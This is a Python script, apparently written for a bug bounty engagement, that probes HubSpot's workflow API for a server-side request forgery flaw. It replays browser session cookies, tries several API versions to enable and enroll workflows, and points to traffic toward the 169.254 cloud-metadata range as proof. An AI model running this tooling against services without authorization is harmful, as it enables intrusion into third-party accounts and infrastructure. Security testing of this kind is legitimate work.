#!/usr/bin/env python3
"""
HubSpot SSRF Testing Script with Session Cookies
Author: BBHK Security Team
Date: August 20, 2025
Purpose: Ethical testing of SSRF vulnerability within bug bounty scope
"""

import json
import requests
import time
import sys
from datetime import datetime

# Configuration
BASE_URL = "https://api.hubapi.com"
WORKFLOW_IDS = ["44038192", "44038202", "44038223"]  # Our created workflows

def load_cookies():
    """Load cookies from JSON file or prompt for input"""
    try:
        with open('hubspot_cookies.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print("No cookies file found. Please paste cookies from browser:")
        print("1. Login to app.hubspot.com")
        print("2. Open DevTools (F12) -> Console")
        print("3. Run: document.cookie")
        print("4. Paste the output here:")
        
        cookie_string = input().strip()
        cookies = {}
        
        for cookie in cookie_string.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                if 'hubspot' in key.lower() or '__hs' in key:
                    cookies[key] = value
        
        # Save for future use
        with open('hubspot_cookies.json', 'w') as f:
            json.dump(cookies, f)
        
        return cookies

def format_cookie_header(cookies):
    """Format cookies for HTTP header"""
    return "; ".join([f"{k}={v}" for k, v in cookies.items()])

def test_workflow_enable(workflow_id, cookies):
    """Attempt to enable a workflow using session cookies"""
    print(f"\n[*] Testing workflow enable for ID: {workflow_id}")
    
    headers = {
        "Cookie": format_cookie_header(cookies),
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    
    # Try different API versions
    endpoints = [
        f"/automation/v4/workflows/{workflow_id}",
        f"/automation/v3/workflows/{workflow_id}",
        f"/automation/v2/workflows/{workflow_id}"
    ]
    
    for endpoint in endpoints:
        url = BASE_URL + endpoint
        print(f"  [>] Trying: {url}")
        
        try:
            # Attempt PATCH to enable
            response = requests.patch(
                url,
                headers=headers,
                json={"enabled": True, "status": "ACTIVE"},
                timeout=10
            )
            
            print(f"  [<] Status: {response.status_code}")
            
            if response.status_code in [200, 201, 202]:
                print(f"  [✓] SUCCESS! Workflow enabled via {endpoint}")
                return True, response.json()
            elif response.status_code == 404:
                print(f"  [!] Workflow not found at this endpoint")
            elif response.status_code in [401, 403]:
                print(f"  [!] Authentication failed - cookies may be invalid")
            else:
                print(f"  [!] Response: {response.text[:200]}")
                
        except Exception as e:
            print(f"  [!] Error: {str(e)}")
    
    return False, None

def create_test_contact(cookies):
    """Create a test contact for enrollment"""
    print("\n[*] Creating test contact for enrollment...")
    
    headers = {
        "Cookie": format_cookie_header(cookies),
        "Content-Type": "application/json"
    }
    
    contact_data = {
        "properties": {
            "email": f"ssrf-test-{int(time.time())}@example.com",
            "firstname": "SSRF",
            "lastname": "Test"
        }
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/crm/v3/objects/contacts",
            headers=headers,
            json=contact_data,
            timeout=10
        )
        
        if response.status_code in [200, 201]:
            contact = response.json()
            print(f"  [✓] Contact created: {contact.get('id')}")
            return contact.get('id')
        else:
            print(f"  [!] Failed to create contact: {response.status_code}")
            return None
            
    except Exception as e:
        print(f"  [!] Error creating contact: {str(e)}")
        return None

def test_workflow_enrollment(workflow_id, contact_id, cookies):
    """Attempt to enroll a contact in a workflow"""
    print(f"\n[*] Testing enrollment for workflow {workflow_id} with contact {contact_id}")
    
    headers = {
        "Cookie": format_cookie_header(cookies),
        "Content-Type": "application/json"
    }
    
    # Try different enrollment endpoints
    endpoints = [
        f"/automation/v2/workflows/{workflow_id}/enrollments/contacts/{contact_id}",
        f"/automation/v3/workflows/{workflow_id}/enrollments",
        f"/automation/v4/actions/enrollments"
    ]
    
    for endpoint in endpoints:
        url = BASE_URL + endpoint
        print(f"  [>] Trying: {url}")
        
        try:
            if "v2" in endpoint:
                response = requests.post(url, headers=headers, timeout=10)
            else:
                # v3/v4 might need different payload
                response = requests.post(
                    url,
                    headers=headers,
                    json={"objectId": contact_id, "objectType": "CONTACT"},
                    timeout=10
                )
            
            print(f"  [<] Status: {response.status_code}")
            
            if response.status_code in [200, 201, 202]:
                print(f"  [✓] SUCCESS! Contact enrolled via {endpoint}")
                return True
            elif response.status_code == 400:
                print(f"  [!] Bad request - workflow may be OFF")
            else:
                print(f"  [!] Response: {response.text[:200]}")
                
        except Exception as e:
            print(f"  [!] Error: {str(e)}")
    
    return False

def check_workflow_executions(workflow_id, cookies):
    """Check if workflow has any executions"""
    print(f"\n[*] Checking executions for workflow {workflow_id}")
    
    headers = {
        "Cookie": format_cookie_header(cookies),
        "Accept": "application/json"
    }
    
    try:
        response = requests.get(
            f"{BASE_URL}/automation/v4/workflows/{workflow_id}/executions",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get('results'):
                print(f"  [✓] Found {len(data['results'])} executions!")
                for execution in data['results'][:3]:
                    print(f"    - Status: {execution.get('status')}, ID: {execution.get('id')}")
                return True
            else:
                print(f"  [!] No executions found")
        else:
            print(f"  [!] Failed to check executions: {response.status_code}")
            
    except Exception as e:
        print(f"  [!] Error: {str(e)}")
    
    return False

def main():
    """Main testing flow"""
    print("=" * 60)
    print("HubSpot SSRF Testing with Session Cookies")
    print("=" * 60)
    
    # Load cookies
    cookies = load_cookies()
    if not cookies:
        print("[!] No valid cookies found. Exiting.")
        return
    
    print(f"\n[+] Loaded {len(cookies)} cookies")
    
    # Test each workflow
    enabled_workflows = []
    for workflow_id in WORKFLOW_IDS:
        success, data = test_workflow_enable(workflow_id, cookies)
        if success:
            enabled_workflows.append(workflow_id)
            time.sleep(2)  # Avoid rate limiting
    
    if not enabled_workflows:
        print("\n[!] No workflows could be enabled with cookies")
        print("[*] Attempting alternative approach with enrollment...")
        
        # Create test contact
        contact_id = create_test_contact(cookies)
        if contact_id:
            # Try enrollment on all workflows
            for workflow_id in WORKFLOW_IDS:
                if test_workflow_enrollment(workflow_id, contact_id, cookies):
                    enabled_workflows.append(workflow_id)
                time.sleep(2)
    
    # Check for executions
    if enabled_workflows:
        print(f"\n[+] Successfully interacted with {len(enabled_workflows)} workflows")
        print("[*] Waiting 10 seconds for executions...")
        time.sleep(10)
        
        for workflow_id in enabled_workflows:
            check_workflow_executions(workflow_id, cookies)
    
    # Summary
    print("\n" + "=" * 60)
    print("TESTING SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().isoformat()}")
    print(f"Workflows tested: {len(WORKFLOW_IDS)}")
    print(f"Workflows enabled/enrolled: {len(enabled_workflows)}")
    
    if enabled_workflows:
        print("\n[✓] POTENTIAL SUCCESS - Check network traffic for SSRF evidence!")
        print("    Run: sudo tcpdump -r ssrf-proof.pcap | grep 169.254")
    else:
        print("\n[!] Testing blocked - consider pivoting to IDOR or new target")
    
    # Save results
    results = {
        "timestamp": datetime.now().isoformat(),
        "cookies_used": list(cookies.keys()),
        "workflows_tested": WORKFLOW_IDS,
        "workflows_enabled": enabled_workflows
    }
    
    with open('ssrf_test_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[+] Results saved to ssrf_test_results.json")

if __name__ == "__main__":
    main()